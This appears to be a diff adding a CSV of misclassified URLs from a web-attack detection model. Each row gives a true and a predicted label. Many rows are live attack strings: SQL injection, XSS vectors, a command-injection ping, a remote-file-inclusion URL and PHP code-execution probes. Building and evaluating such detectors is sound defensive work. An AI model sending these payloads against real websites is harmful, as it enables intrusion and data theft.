@@ -1,0 +1,71 @@
+URL,True Label,Predicted Label
+"/flashxss/
+",1,[0]
+")) and 0=benchmark(3000000,MD5(1))%20/*
+",1,[0]
+"--sp_password
+",1,[0]
+"/post.asp?method=topic&forum_id=1&cat_id=1&type=wvs-xss-magic-string-410016083323
+",1,[0]
+"/spymacxss/
+",1,[0]
+"& ping -n 30 127.0.0.1 &
+",1,[0]
+"--sp_password
+",1,[0]
+"nessus nessus nessus nessu
+",0,[1]
+"/inscripcion/
+",0,[1]
+"/encript/
+",0,[1]
+"null
+",1,[0]
+"\nnetstat -a%\n
+",1,[0]
+"$null
+",1,[0]
+"/phpmyadmin/documentation.html?phpmyadmin=!(()&&!|*|*|
+",0,[1]
+"<body/onload=self[/loca/.source%2b/tion/.source]=name//
+",1,[0]
+" group by userid having 1=1--
+",1,[0]
+"/trace.axd
+",0,[1]
+"/trace.axd
+",0,[1]
+"/java_script/
+",1,[0]
+"/tikiwiki/tiki-graph_formula.php?f[]=x.tan.phpinfo()&h=1&max=2&min=1&s=1&t=png&title=@rfiurl&w=1
+",1,[0]
+"/speedberg/include/scriplet.inc.php?speedberg_path=http://192.168.202.118:8080/tzhfyzkbomspvm?
+",0,[1]
+"to_timestamp_tz
+",1,[0]
+"/skripty/
+",0,[1]
+"/examples/jsp/jsp2/jspx/awstatstotals.php?sort={${phpinfo()}}{${exit()}}
+",1,[0]
+"/examples/jsp/colors/awstatstotals.php?sort={${phpinfo()}}{${exit()}}
+",1,[0]
+"/stat/awstatstotals.php?sort={${phpinfo()}}{${exit()}}
+",1,[0]
+"/googlefight-xss/
+",1,[0]
+"/phpimageview.php?pic=javascript:alert(8754)
+",1,[0]
+"/02bntxiz_suscripciones/
+",0,[1]
+"/scraptannedcowhides/
+",0,[1]
+"15+/*!union*/+/*!all*/+/*!select*/+1,2,3,4,5,6,7--
+",1,[0]
+"update
+",1,[0]
+".replace(/.+/,eval)//
+",1,[0]
+"iframe.contentWindow.location.constructor.prototype
+",1,[0]
+"/ico_scrap/
+",0,[1]
